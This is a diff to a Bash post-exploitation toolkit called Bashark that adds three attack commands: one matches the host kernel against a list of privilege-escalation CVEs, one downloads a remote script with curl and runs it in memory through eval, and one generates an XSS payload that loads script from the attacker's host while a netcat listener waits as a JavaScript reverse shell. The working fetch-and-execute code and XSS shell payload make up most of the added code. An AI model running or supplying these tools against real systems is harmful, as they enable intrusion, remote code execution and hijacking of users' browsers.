@@ -777,6 +777,116 @@ bruteforce(){
 
 }
 
+cve(){
+    if [[ "$@" =~ .*-h.* ]]; then
+        echo "
+        ${underline}USAGE:${reset}       
+            cve [-h] 
+        ${underline}DESCRIPTION:${reset}
+            Search for kernel exploits"
+    else
+        hits=0
+        declare -A exploits
+        exploits=(  ["2.4.20|2.2.24|2.4.25|2.4.26|2.4.27"]="CVE-2004-0077"
+                    ["2.4.29"]="CVE-2004-1235"
+                    ["2.6.34|2.6.35|2.6.36"]="caps_to_root (https://github.com/SecWiki/linux-kernel-exploits/blob/master/2004/caps_to_root/15916.c)" 
+                    ["2.6.5|2.6.7|2.6.8|2.6.9|2.6.10|2.6.11"]="CVE-2005-0736" 
+                    ["2.6.13|2.6.14|2.6.15|2.6.16|2.6.17"]="CVE-2006-2451"
+                    ["2.6.8|2.6.10|2.6.11|2.6.12|2.6.13|2.6.14|2.6.15|2.6.16"]="CVE-2006-3626"
+                    ["2.6.23|2.6.24"]="CVE-2008-0600"
+                    ["2.6.17|2.6.18|2.6.19|2.6.20|2.6.21|2.6.22|2.6.23|2.6.24|2.6.24.1"]="CVE-2008-0900"
+                    ["2.6.11|2.6.12|2.6.13|2.6.14|2.6.15|2.6.16|2.6.17|2.6.18|2.6.19|2.6.20|2.6.21|2.6.22"]="CVE-2008-4210"
+                    ["2.6.25|2.6.26|2.6.27|2.6.28|2.6.29"]="CVE-2009-1185"
+                    ["2.6.25|2.6.26|2.6.27|2.6.28|2.6.29"]="CVE-2009-1337"
+                    ["2.4.[4-37]|2.6.[0-30]"]="CVE-2009-2692" 
+                    ["2.6.[1-19]"]="CVE-2009-2698"
+                    ["2.4.[4-37]|2.6.[15-31]"]="CVE-2009-3547" )
+        kernel=`uname -r`
+        for exploit in "${!exploits[@]}"; do
+            echo ${kernel}|grep -E ${exploit} > tmp
+            check=$?
+            if [ "$check" -eq 0 ]; then
+                echo "${red}${bold}<.>${reset} ${exploits[$exploit]}" 
+                ((hits++))
+            fi
+        done
+        if [ $hits = 0 ]; then
+            print_error "No exploits found"
+        else
+            echo "${magenta}(${hits} hits )${reset}"
+        fi
+        rm tmp
+    fi
+}
+
+
+memexec(){ 
+    if [[ "$@" =~ .*-h.* ]]; then
+        echo "
+        ${underline}USAGE:${reset}       
+            dexec [-h] HOST URL
+        ${underline}POSITIONAL ARGUMENTS:${reset} 
+            HOST    Remote server address 
+            URL     Full path of the script on the remote server
+        ${underline}DESCRIPTION:${reset}
+            Download and execute a remote bash script in memory"
+    else
+        if [ $# -eq 0 ]; then
+            print_error "Specify the server address"
+        elif [ $# -eq 1 ]; then
+            print_error "Specify the URL of the script"
+        else
+            host=$1
+            script=$2
+            X=`curl -fsSL "http://${host}/${script}"`
+            eval "$X"
+            print_good "Succesfully executed ${script} from memory"
+        fi
+    fi
+}
+
+jshell(){
+    arguments_errors=0 
+    if [[ "$@" =~ .*-h.* ]]; then
+        echo "
+        ${underline}USAGE:${reset}       
+            jshell [-h] LHOST LPORT
+        ${underline}POSITIONAL ARGUMENTS:${reset} 
+            LHOST    Local address to listen on (set to "-" to automatically detect the ip) 
+            LPORT    Local port to listen on
+        ${underline}DESCRIPTION:${reset}
+            Get a Javascript shell with XSS"
+    else
+        if [[ "$1" =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
+            lhost=$1
+        elif [ "$1" = "-" ]; then
+            lhost=`ip address | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'`
+        else
+            print_error "Wrong IP address format"
+            ((arguments_errors++))
+        fi
+        if [ "$2" -eq "$2" ] 2>/dev/null; then
+            lport=$2
+        else
+            print_error "Wrong port format: integer required"
+            ((arguments_errors++))
+        fi
+        if [ $arguments_errors = 0 ]; then
+            if [ "$OSTYPE" = "darwin" ]; then
+                netcat_cmd="nc -nlvk ${lport}"
+            else
+                netcat_cmd="nc -nlvp ${lport}"
+            fi
+            payload="<svg/onload=setInterval(function(){with(document)body.appendChild(createElement('script')).src='//${lhost}:${lport}'},100);>"
+            print_good "Generated JS payload:"
+            echo ${payload}
+            echo
+            print_info "Waiting for the payload to be executed..."
+            out=`$netcat_cmd`
+        fi
+    fi
+}
+
 ###Commands that require root
 portblock(){
     if [[ "$@" =~ .*-h.* ]]; then 
@@ -900,6 +1010,7 @@ Bashark ver. 1.0 Commands:
         ${bold}bruteforce${reset}${green}   -> ${reset}Perform a dictionary attack against a protected file
         ${bold}c${reset}${green}            -> ${reset}Clear screen
         ${bold}cleanup${reset}${green}      -> ${reset}Modify Bashark cleanup routine settings
+        ${bold}cve${reset}${green}          -> ${reset}Search for a kernel exploit
         ${bold}esc${reset}${green}          -> ${reset}Escape to a non-restricted shell
         ${bold}fnd${reset}${green}          -> ${reset}Recursively search for string occurrence in current directory
         ${bold}fndre${reset}${green}        -> ${reset}Search for most popular regullar expressions in a file
@@ -911,8 +1022,10 @@ Bashark ver. 1.0 Commands:
         ${bold}hosts${reset}${green}        -> ${reset}Enumerate active hosts in background
         ${bold}i${reset}${green}            -> ${reset}Show information about host
         ${bold}isvm${reset}${green}         -> ${reset}Check if OS is running on virtual machine
+        ${bold}jshell${reset}${green}       -> ${reset}Establish a reverse Javascript shell
         ${bold}lg${reset}${green}           -> ${reset}Search for regular expression in filenames of current directory
         ${bold}mex${reset}${green}          -> ${reset}Make file executable
+        ${bold}memexec${reset}${green}      -> ${reset}Download and execute remote bash script in memory
         ${bold}mkd${reset}${green}          -> ${reset}Create a directory
         ${bold}portscan${reset}${green}     -> ${reset}Perform a portscan
         ${bold}quit${reset}${green}         -> ${reset}Exit Bashark
